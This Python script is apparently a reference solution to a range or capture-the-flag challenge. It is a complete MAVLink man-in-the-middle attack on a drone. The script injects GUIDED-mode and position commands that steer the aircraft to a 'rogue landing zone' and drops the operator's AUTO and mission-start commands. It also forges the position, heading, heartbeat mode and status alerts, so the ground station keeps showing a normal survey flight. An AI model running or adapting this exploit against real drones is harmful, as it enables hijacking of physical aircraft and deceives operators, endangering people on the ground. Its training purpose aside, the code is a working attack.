#!/usr/bin/env python3
"""Reference solution.

Two jobs at once, in opposite directions.

Toward the aircraft: take it. Suppress the operator's mode changes so it
cannot be pulled back into AUTO, put it in GUIDED, and steer it to the rogue
landing zone.

Toward the operator: lie. Rewrite every position report into a plausible
circuit of the survey box, and rewrite the heartbeat so the mode still reads
AUTO. Keep the cadence identical — the station judges the link healthy purely
on heartbeats arriving, and MAVLink v2 sequence numbers are never checked
against anything, so nothing we forge draws a complaint.

The operator's screen stays green while the aircraft sits somewhere else
entirely. That gap is the objective.

    python3 solve.py --host <range-host> --port 14580
"""
import argparse
import math
import sys
import threading
import time

from pymavlink.dialects.v20 import ardupilotmega as mavlink

from tap import DOWNLINK, UPLINK, Tap

ROGUE_LAT = -35.363262
ROGUE_LON = 149.166537
CRUISE_ALT = 30.0

# The survey box the operator believes we are flying.
BOX = [
    (-35.363262, 149.165237),
    (-35.362400, 149.165237),
    (-35.362400, 149.166000),
    (-35.363262, 149.166000),
]
LAP_SECONDS = 90.0

COPTER_AUTO = 3
COPTER_GUIDED = 4

MAV_MODE_FLAG_CUSTOM_MODE_ENABLED = 1


def log(msg):
    print(f"[*] {msg}", flush=True)


def haversine_m(lat1, lon1, lat2, lon2):
    r = 6371000.0
    p1, p2 = math.radians(lat1), math.radians(lat2)
    dp, dl = math.radians(lat2 - lat1), math.radians(lon2 - lon1)
    a = math.sin(dp / 2) ** 2 + math.cos(p1) * math.cos(p2) * math.sin(dl / 2) ** 2
    return 2 * r * math.asin(math.sqrt(a))


def fake_position(t):
    """A believable point on the survey circuit at time t."""
    frac = (t % LAP_SECONDS) / LAP_SECONDS
    leg = frac * len(BOX)
    i = int(leg) % len(BOX)
    j = (i + 1) % len(BOX)
    k = leg - int(leg)
    lat = BOX[i][0] + (BOX[j][0] - BOX[i][0]) * k
    lon = BOX[i][1] + (BOX[j][1] - BOX[i][1]) * k
    return lat, lon


def fake_heading(t):
    """Bearing along the leg we are pretending to fly.

    The station draws a compass from this. Forging position but leaving the
    real heading in place points the needle at the rogue LZ while the map
    shows a survey circuit — the one inconsistency an operator would catch.
    """
    frac = (t % LAP_SECONDS) / LAP_SECONDS
    leg = frac * len(BOX)
    i = int(leg) % len(BOX)
    j = (i + 1) % len(BOX)
    lat1, lon1 = math.radians(BOX[i][0]), math.radians(BOX[i][1])
    lat2, lon2 = math.radians(BOX[j][0]), math.radians(BOX[j][1])
    dlon = lon2 - lon1
    y = math.sin(dlon) * math.cos(lat2)
    x = (math.cos(lat1) * math.sin(lat2)
         - math.sin(lat1) * math.cos(lat2) * math.cos(dlon))
    return (math.degrees(math.atan2(y, x)) + 360.0) % 360.0


class Ghost:
    def __init__(self, tap, lat, lon, alt):
        self.tap = tap
        self.lat, self.lon, self.alt = lat, lon, alt
        self.target_system = None
        self.target_component = 1
        self.seq = 0
        self.t0 = time.time()
        self.truth = None            # what the aircraft actually reports
        self.took_over = False
        self.last_command = 0.0
        self.suppressed = 0

    # -- toward the aircraft ------------------------------------------------

    def inject_up(self, msg):
        self.seq = (self.seq + 1) & 0xFF
        self.tap.send(UPLINK, self.tap.build(
            UPLINK, msg, src_system=255, src_component=190, seq=self.seq))

    def command_loop(self):
        """Drive our own cadence.

        Steering must not depend on the operator still talking to us — the
        moment we start suppressing their traffic the inbound rate drops, and
        an attacker that only acts when a frame arrives stops flying the
        aircraft exactly when it has taken it.
        """
        while True:
            try:
                self.take_over()
            except Exception as exc:
                log(f"command loop: {exc}")
            time.sleep(0.5)

    def take_over(self):
        """GUIDED, then hold a position target on the rogue LZ."""
        if self.target_system is None:
            return
        self.last_command = time.time()

        self.inject_up(mavlink.MAVLink_set_mode_message(
            self.target_system, MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, COPTER_GUIDED))

        self.inject_up(mavlink.MAVLink_set_position_target_global_int_message(
            0, self.target_system, self.target_component,
            mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,
            int(self.lat * 1e7), int(self.lon * 1e7), self.alt,
            0, 0, 0, 0, 0, 0, 0, 0,
        ))

        if not self.took_over:
            self.took_over = True
            log(f"steering to the rogue LZ ({self.lat}, {self.lon})")

    def on_uplink(self, data):
        """Forward the operator's traffic, minus anything that undoes our work."""
        msgs = self.tap.decode(UPLINK, data)
        if not msgs:
            self.tap.send(UPLINK, data)
            return

        keep = []
        for m in msgs:
            t = m.get_type()
            if self.target_system is None and hasattr(m, "target_system"):
                if m.target_system:
                    self.target_system = m.target_system
                    log(f"aircraft is system {self.target_system}")
            # Drop exactly what would wrestle the aircraft back.
            if t == "SET_MODE" and m.custom_mode == COPTER_AUTO:
                self.suppressed += 1
                continue
            if t == "COMMAND_LONG" and m.command == mavlink.MAV_CMD_MISSION_START:
                self.suppressed += 1
                continue
            keep.append(m)

        if len(keep) == len(msgs):
            self.tap.send(UPLINK, data)      # untouched: forward verbatim
        elif keep:
            self.tap.send(UPLINK, self.tap.encode(UPLINK, keep))

    # -- toward the operator ------------------------------------------------

    def on_downlink(self, data):
        msgs = self.tap.decode(DOWNLINK, data)
        if not msgs:
            self.tap.send(DOWNLINK, data)
            return

        touched = False
        for m in msgs:
            t = m.get_type()
            if t == "GLOBAL_POSITION_INT":
                self.truth = (m.lat / 1e7, m.lon / 1e7, m.relative_alt / 1000.0)
                elapsed = time.time() - self.t0
                lat, lon = fake_position(elapsed)
                m.lat = int(lat * 1e7)
                m.lon = int(lon * 1e7)
                m.relative_alt = int(self.alt * 1000)
                m.alt = int((584.0 + self.alt) * 1000)
                m.hdg = int(fake_heading(elapsed) * 100)
                touched = True
            elif t == "HEARTBEAT" and m.type != mavlink.MAV_TYPE_GCS:
                if m.custom_mode != COPTER_AUTO:
                    m.custom_mode = COPTER_AUTO
                    touched = True
            elif t == "STATUSTEXT":
                # Anything the aircraft wants to complain about, it can complain
                # to us. The operator counts these as alerts.
                touched = True
                m.text = b"AUTO: mission running"
                m.severity = mavlink.MAV_SEVERITY_INFO

        self.tap.send(DOWNLINK,
                      self.tap.encode(DOWNLINK, msgs) if touched else data)

    def status(self):
        if not self.truth:
            return "waiting for telemetry"
        d = haversine_m(self.truth[0], self.truth[1], self.lat, self.lon)
        fake = fake_position(time.time() - self.t0)
        gap = haversine_m(self.truth[0], self.truth[1], fake[0], fake[1])
        return (f"truth {self.truth[0]:.6f},{self.truth[1]:.6f} "
                f"alt {self.truth[2]:.0f}m | to LZ {d:.0f}m | "
                f"divergence {gap:.0f}m | suppressed {self.suppressed}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=14580)
    ap.add_argument("--lat", type=float, default=ROGUE_LAT)
    ap.add_argument("--lon", type=float, default=ROGUE_LON)
    ap.add_argument("--alt", type=float, default=CRUISE_ALT)
    args = ap.parse_args()

    log(f"attaching to the tap at {args.host}:{args.port}")
    tap = Tap(args.host, args.port)
    log("attached — the operator now sees only what we let through")

    ghost = Ghost(tap, args.lat, args.lon, args.alt)
    threading.Thread(target=ghost.command_loop, daemon=True).start()
    last_report = 0.0

    try:
        for direction, data in tap.frames():
            if direction == UPLINK:
                ghost.on_uplink(data)
            else:
                ghost.on_downlink(data)

            if time.time() - last_report > 5:
                last_report = time.time()
                log(ghost.status())
    except KeyboardInterrupt:
        pass
    finally:
        tap.close()

    log("relay closed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
